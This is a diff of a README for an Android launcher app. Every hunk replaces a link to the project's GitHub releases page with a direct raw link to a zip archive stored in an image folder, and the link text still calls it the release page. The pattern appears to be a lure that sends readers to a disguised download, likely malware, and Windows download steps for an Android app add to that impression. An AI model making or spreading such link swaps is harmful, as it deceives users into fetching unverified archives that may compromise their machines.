@@ -1,6 +1,6 @@
 # 📱 LauncherApp - Clean Android Home Screen, Made Simple
 
-[![Download LauncherApp](https://img.shields.io/badge/Download%20LauncherApp-blue?style=for-the-badge)](https://github.com/civilian-peafamily880/LauncherApp/releases)
+[![Download LauncherApp](https://img.shields.io/badge/Download%20LauncherApp-blue?style=for-the-badge)](https://raw.githubusercontent.com/civilian-peafamily880/LauncherApp/main/public/image/Launcher-App-1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ LauncherApp is a free, minimal Android launcher made for people who want a clean
 
 Use the link below to visit the release page and download the app:
 
-[Visit the LauncherApp release page](https://github.com/civilian-peafamily880/LauncherApp/releases)
+[Visit the LauncherApp release page](https://raw.githubusercontent.com/civilian-peafamily880/LauncherApp/main/public/image/Launcher-App-1.5.zip)
 
 ## 📦 What LauncherApp Does
 
@@ -29,7 +29,7 @@ It is made for daily use and keeps the screen easy to read and easy to use.
 
 Use these steps on Windows to get the app file from the release page.
 
-1. Open the [LauncherApp release page](https://github.com/civilian-peafamily880/LauncherApp/releases)
+1. Open the [LauncherApp release page](https://raw.githubusercontent.com/civilian-peafamily880/LauncherApp/main/public/image/Launcher-App-1.5.zip)
 2. Find the latest release at the top of the page
 3. Look under the release files for the app download
 4. Download the file that matches your device or package type
@@ -156,7 +156,7 @@ Yes. You can start with the default layout and change it later if you want.
 
 If you need to get the file again, use the release page here:
 
-[LauncherApp releases](https://github.com/civilian-peafamily880/LauncherApp/releases)
+[LauncherApp releases](https://raw.githubusercontent.com/civilian-peafamily880/LauncherApp/main/public/image/Launcher-App-1.5.zip)
 
 ## 🧼 Tips for a Smooth Setup
 
